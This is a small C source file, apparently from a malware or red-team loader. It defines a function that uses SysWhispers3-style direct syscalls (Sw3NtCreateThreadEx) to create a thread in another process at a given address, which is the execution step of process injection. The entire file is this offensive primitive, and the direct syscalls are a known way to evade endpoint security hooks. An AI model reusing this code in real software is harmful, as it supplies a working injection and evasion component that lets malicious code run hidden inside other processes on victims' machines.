#include "common.h"
#include "syscalls.h"

VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress)
{
	HANDLE hThread = NULL;
	Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	Sw3NtWaitForSingleObject(hThread, FALSE, 2000);
}